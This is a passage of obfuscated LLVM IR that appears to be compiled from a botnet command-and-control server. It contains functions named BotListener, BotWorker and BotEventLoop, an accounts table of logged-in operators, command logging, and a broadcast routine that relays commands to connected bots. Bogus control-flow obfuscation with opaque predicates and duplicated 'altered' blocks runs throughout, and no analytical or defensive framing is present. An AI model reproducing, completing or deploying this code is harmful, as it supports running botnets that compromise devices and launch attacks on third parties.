  br label %originalBB220

originalBB224alteredBB:                           ; preds = %originalBB224, %1624
  br label %originalBB224

originalBB228alteredBB:                           ; preds = %originalBB228, %1648
  br label %originalBB228

originalBB232alteredBB:                           ; preds = %originalBB232, %1665
  %2127 = load i32, i32* %4, align 4
  %2128 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %2129 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i32 0, i32 0
  %2130 = call i64 @strlen(i8* %2129) #8
  %2131 = call i64 @send(i32 %2127, i8* %2128, i64 %2130, i32 16384)
  %2132 = icmp eq i64 %2131, -1
  br label %originalBB232

originalBB236alteredBB:                           ; preds = %originalBB236, %1705
  %2133 = load i32, i32* %4, align 4
  %2134 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %2135 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i32 0, i32 0
  %2136 = call i64 @strlen(i8* %2135) #8
  %2137 = call i64 @send(i32 %2133, i8* %2134, i64 %2136, i32 16384)
  %2138 = icmp eq i64 %2137, -1
  br label %originalBB236

originalBB240alteredBB:                           ; preds = %originalBB240, %1728
  br label %originalBB240

originalBB244alteredBB:                           ; preds = %originalBB244, %1753
  br label %originalBB244

originalBB248alteredBB:                           ; preds = %originalBB248, %1775
  br label %originalBB248

originalBB252alteredBB:                           ; preds = %originalBB252, %1793
  %2139 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2140 = call i8* @strstr(i8* %2139, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0)) #8
  %2141 = icmp ne i8* %2140, null
  br label %originalBB252

originalBB256alteredBB:                           ; preds = %originalBB256, %1828
  br label %originalBB256

originalBB260alteredBB:                           ; preds = %originalBB260, %1853
  %2142 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2143 = call i64 @strlen(i8* %2142) #8
  %2144 = icmp eq i64 %2143, 0
  br label %originalBB260

originalBB264alteredBB:                           ; preds = %originalBB264, %1873
  br label %originalBB264

originalBB268alteredBB:                           ; preds = %originalBB268, %1890
  %2145 = load i32, i32* %5, align 4
  %2146 = sext i32 %2145 to i64
  %2147 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %2146
  %2148 = getelementptr inbounds %struct.login_info, %struct.login_info* %2147, i32 0, i32 0
  %2149 = getelementptr inbounds [20 x i8], [20 x i8]* %2148, i32 0, i32 0
  %2150 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2151 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i32 0, i32 0), i8* %2149, i8* %2150)
  %2152 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0))
  store %struct._IO_FILE* %2152, %struct._IO_FILE** %56, align 8
  %2153 = call i64 @time(i64* null) #7
  store i64 %2153, i64* %57, align 8
  %2154 = call %struct.tm* @gmtime(i64* %57) #7
  store %struct.tm* %2154, %struct.tm** %58, align 8
  %2155 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i32 0, i32 0
  %2156 = load %struct.tm*, %struct.tm** %58, align 8
  %2157 = call i64 @strftime(i8* %2155, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i32 0, i32 0), %struct.tm* %2156) #7
  %2158 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %2159 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i32 0, i32 0
  %2160 = load i32, i32* %5, align 4
  %2161 = sext i32 %2160 to i64
  %2162 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %2161
  %2163 = getelementptr inbounds %struct.login_info, %struct.login_info* %2162, i32 0, i32 0
  %2164 = getelementptr inbounds [20 x i8], [20 x i8]* %2163, i32 0, i32 0
  %2165 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2166 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2158, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.108, i32 0, i32 0), i8* %2159, i8* %2164, i8* %2165)
  %2167 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %2168 = call i32 @fclose(%struct._IO_FILE* %2167)
  %2169 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2170 = load i32, i32* %4, align 4
  %2171 = load i32, i32* %5, align 4
  %2172 = sext i32 %2171 to i64
  %2173 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %2172
  %2174 = getelementptr inbounds %struct.login_info, %struct.login_info* %2173, i32 0, i32 0
  %2175 = getelementptr inbounds [20 x i8], [20 x i8]* %2174, i32 0, i32 0
  call void @broadcast(i8* %2169, i32 %2170, i8* %2175)
  %2176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %2176, i8 0, i64 2048, i32 16, i1 false)
  br label %originalBB268

originalBB272alteredBB:                           ; preds = %originalBB272, %1949
  %2177 = load i8*, i8** %2, align 8
  br label %originalBB272
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

declare i32 @system(i8*) #1

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotListener(i32) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %10 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %10, i32* %4, align 4
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %30

; <label>:13:                                     ; preds = %1
  %14 = load i32, i32* @x.17
  %15 = load i32, i32* @y.18
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i32 0, i32 0))
  %22 = load i32, i32* @x.17
  %23 = load i32, i32* @y.18
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %originalBBpart2, %1
  %31 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 16, i32 4, i1 false)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %34 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %33, i32 0, i32 0
  store i32 0, i32* %34, align 4
  %35 = load i32, i32* %3, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #9
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  %39 = load i32, i32* %4, align 4
  %40 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %41 = call i32 @bind(i32 %39, %struct.sockaddr* %40, i32 16) #7
  %42 = icmp slt i32 %41, 0
  br i1 %42, label %43, label %60

; <label>:43:                                     ; preds = %30
  %44 = load i32, i32* @x.17
  %45 = load i32, i32* @y.18
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.110, i32 0, i32 0))
  %52 = load i32, i32* @x.17
  %53 = load i32, i32* @y.18
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %60

; <label>:60:                                     ; preds = %originalBBpart24, %30
  %61 = load i32, i32* %4, align 4
  %62 = call i32 @listen(i32 %61, i32 5) #7
  store i32 16, i32* %6, align 4
  br label %63

; <label>:63:                                     ; preds = %originalBBpart28, %60
  %64 = load i32, i32* %4, align 4
  %65 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %66 = call i32 @accept(i32 %64, %struct.sockaddr* %65, i32* %6)
  store i32 %66, i32* %5, align 4
  %67 = load i32, i32* %5, align 4
  %68 = icmp slt i32 %67, 0
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %63
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  br label %70

; <label>:70:                                     ; preds = %69, %63
  %71 = load i32, i32* @x.17
  %72 = load i32, i32* @y.18
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %70
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = inttoptr i64 %80 to i8*
  %82 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %81) #7
  %83 = load i32, i32* @x.17
  %84 = load i32, i32* @y.18
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %63
                                                  ; No predecessors!
  %92 = load i8*, i8** %2, align 8
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %13
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i32 0, i32 0))
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.110, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %70
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = inttoptr i64 %94 to i8*
  %96 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %95) #7
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %14 = load i32, i32* %5, align 4
  %15 = icmp ne i32 %14, 4
  br i1 %15, label %16, label %22

; <label>:16:                                     ; preds = %3
  %17 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %18 = load i8**, i8*** %6, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %17, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.112, i32 0, i32 0), i8* %20)
  call void @exit(i32 1) #10
  unreachable

; <label>:22:                                     ; preds = %3
  %23 = load i32, i32* @x.19
  %24 = load i32, i32* @y.20
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i8**, i8*** %6, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 3
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33) #8
  store i32 %34, i32* %10, align 4
  %35 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i32 0, i32 0))
  store %struct._IO_FILE* %35, %struct._IO_FILE** @telFD, align 8
  %36 = load i8**, i8*** %6, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 2
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @atoi(i8* %38) #8
  store i32 %39, i32* %9, align 4
  %40 = load i8**, i8*** %6, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @create_and_bind(i8* %42)
  store volatile i32 %43, i32* @listenFD, align 4
  %44 = load volatile i32, i32* @listenFD, align 4
  %45 = icmp eq i32 %44, -1
  %46 = load i32, i32* @x.19
  %47 = load i32, i32* @y.20
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %45, label %54, label %71

; <label>:54:                                     ; preds = %originalBBpart2
  %55 = load i32, i32* @x.19
  %56 = load i32, i32* @y.20
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  call void @abort() #10
  %63 = load i32, i32* @x.19
  %64 = load i32, i32* @y.20
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:71:                                     ; preds = %originalBBpart2
  %72 = load i32, i32* @x.19
  %73 = load i32, i32* @y.20
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load volatile i32, i32* @listenFD, align 4
  %81 = call i32 @make_socket_non_blocking(i32 %80)
  store i32 %81, i32* %8, align 4
  %82 = load i32, i32* %8, align 4
  %83 = icmp eq i32 %82, -1
  %84 = load i32, i32* @x.19
  %85 = load i32, i32* @y.20
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %83, label %92, label %93

; <label>:92:                                     ; preds = %originalBBpart28
  call void @abort() #10
  unreachable

; <label>:93:                                     ; preds = %originalBBpart28
  %94 = load volatile i32, i32* @listenFD, align 4
  %95 = call i32 @listen(i32 %94, i32 128) #7
  store i32 %95, i32* %8, align 4
  %96 = load i32, i32* %8, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %93
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:99:                                     ; preds = %93
  %100 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %100, i32* @epollFD, align 4
  %101 = load volatile i32, i32* @epollFD, align 4
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %104

; <label>:103:                                    ; preds = %99
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.116, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* @x.19
  %106 = load i32, i32* @y.20
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %104
  %113 = load volatile i32, i32* @listenFD, align 4
  %114 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %115 = bitcast %union.epoll_data* %114 to i32*
  store i32 %113, i32* %115, align 1
  %116 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %116, align 1
  %117 = load volatile i32, i32* @epollFD, align 4
  %118 = load volatile i32, i32* @listenFD, align 4
  %119 = call i32 @epoll_ctl(i32 %117, i32 1, i32 %118, %struct.epoll_event* %11) #7
  store i32 %119, i32* %8, align 4
  %120 = load i32, i32* %8, align 4
  %121 = icmp eq i32 %120, -1
  %122 = load i32, i32* @x.19
  %123 = load i32, i32* @y.20
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %121, label %130, label %131

; <label>:130:                                    ; preds = %originalBBpart212
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:131:                                    ; preds = %originalBBpart212
  %132 = load i32, i32* %9, align 4
  %133 = add nsw i32 %132, 2
  %134 = zext i32 %133 to i64
  %135 = call i8* @llvm.stacksave()
  store i8* %135, i8** %12, align 8
  %136 = alloca i64, i64 %134, align 16
  br label %137

; <label>:137:                                    ; preds = %157, %131
  %138 = load i32, i32* @x.19
  %139 = load i32, i32* @y.20
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %137
  %146 = load i32, i32* %9, align 4
  %147 = add nsw i32 %146, -1
  store i32 %147, i32* %9, align 4
  %148 = icmp ne i32 %146, 0
  %149 = load i32, i32* @x.19
  %150 = load i32, i32* @y.20
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart222, label %originalBB14alteredBB

originalBBpart222:                                ; preds = %originalBB14
  br i1 %148, label %157, label %163

; <label>:157:                                    ; preds = %originalBBpart222
  %158 = load i32, i32* %9, align 4
  %159 = add nsw i32 %158, 1
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i64, i64* %136, i64 %160
  %162 = call i32 @pthread_create(i64* %161, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #7
  br label %137

; <label>:163:                                    ; preds = %originalBBpart222
  %164 = load i32, i32* @x.19
  %165 = load i32, i32* @y.20
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %163
  %172 = getelementptr inbounds i64, i64* %136, i64 0
  %173 = load i32, i32* %10, align 4
  %174 = sext i32 %173 to i64
  %175 = inttoptr i64 %174 to i8*
  %176 = call i32 @pthread_create(i64* %172, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %175) #7
  %177 = load i32, i32* @x.19
  %178 = load i32, i32* @y.20
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %185

; <label>:185:                                    ; preds = %originalBBpart235, %originalBBpart227
  %186 = load i32, i32* @x.19
  %187 = load i32, i32* @y.20
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %185
  %194 = load i32, i32* @x.19
  %195 = load i32, i32* @y.20
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %202

; <label>:202:                                    ; preds = %originalBBpart231
  %203 = load i32, i32* @x.19
  %204 = load i32, i32* @y.20
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %202
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i32 0, i32 0))
  %211 = call i32 @sleep(i32 60)
  %212 = load i32, i32* @x.19
  %213 = load i32, i32* @y.20
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %185
                                                  ; No predecessors!
  %221 = load i32, i32* %4, align 4
  ret i32 %221

originalBBalteredBB:                              ; preds = %originalBB, %22
  %222 = load i8**, i8*** %6, align 8
  %223 = getelementptr inbounds i8*, i8** %222, i64 3
  %224 = load i8*, i8** %223, align 8
  %225 = call i32 @atoi(i8* %224) #8
  store i32 %225, i32* %10, align 4
  %226 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i32 0, i32 0))
  store %struct._IO_FILE* %226, %struct._IO_FILE** @telFD, align 8
  %227 = load i8**, i8*** %6, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 2
  %229 = load i8*, i8** %228, align 8
  %230 = call i32 @atoi(i8* %229) #8
  store i32 %230, i32* %9, align 4
  %231 = load i8**, i8*** %6, align 8
  %232 = getelementptr inbounds i8*, i8** %231, i64 1
  %233 = load i8*, i8** %232, align 8
  %234 = call i32 @create_and_bind(i8* %233)
  store volatile i32 %234, i32* @listenFD, align 4
  %235 = load volatile i32, i32* @listenFD, align 4
  %236 = icmp eq i32 %235, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  call void @abort() #10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %237 = load volatile i32, i32* @listenFD, align 4
  %238 = call i32 @make_socket_non_blocking(i32 %237)
  store i32 %238, i32* %8, align 4
  %239 = load i32, i32* %8, align 4
  %240 = icmp eq i32 %239, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %104
  %241 = load volatile i32, i32* @listenFD, align 4
  %242 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %243 = bitcast %union.epoll_data* %242 to i32*
  store i32 %241, i32* %243, align 1
  %244 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %244, align 1
  %245 = load volatile i32, i32* @epollFD, align 4
  %246 = load volatile i32, i32* @listenFD, align 4
  %247 = call i32 @epoll_ctl(i32 %245, i32 1, i32 %246, %struct.epoll_event* %11) #7
  store i32 %247, i32* %8, align 4
  %248 = load i32, i32* %8, align 4
  %249 = icmp eq i32 %248, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %137
  %250 = load i32, i32* %9, align 4
  %_ = sub i32 0, %250
  %gen = add i32 %_, -1
  %_15 = sub i32 0, %250
  %gen16 = add i32 %_15, -1
  %_17 = sub i32 %250, -1
  %gen18 = mul i32 %_17, -1
  %_19 = sub i32 %250, -1
  %gen20 = mul i32 %_19, -1
  %251 = add nsw i32 %250, -1
  store i32 %251, i32* %9, align 4
  %252 = icmp ne i32 %250, 0
  br label %originalBB14

originalBB24alteredBB:                            ; preds = %originalBB24, %163
  %253 = getelementptr inbounds i64, i64* %136, i64 0
  %254 = load i32, i32* %10, align 4
  %255 = sext i32 %254 to i64
  %256 = inttoptr i64 %255 to i8*
  %257 = call i32 @pthread_create(i64* %253, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %256) #7
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %185
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %202
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i32 0, i32 0))
  %258 = call i32 @sleep(i32 60)
  br label %originalBB33
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %2 = load i32, i32* @x.21
  %3 = load i32, i32* @y.22
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca %struct.addrinfo, align 8
  %13 = alloca %struct.addrinfo*, align 8
  %14 = alloca %struct.addrinfo*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  %18 = bitcast %struct.addrinfo* %12 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 48, i32 8, i1 false)
  %19 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %12, i32 0, i32 1
  store i32 0, i32* %19, align 4
  %20 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %12, i32 0, i32 2
  store i32 1, i32* %20, align 8
  %21 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %12, i32 0, i32 0
  store i32 1, i32* %21, align 8
  %22 = load i8*, i8** %11, align 8
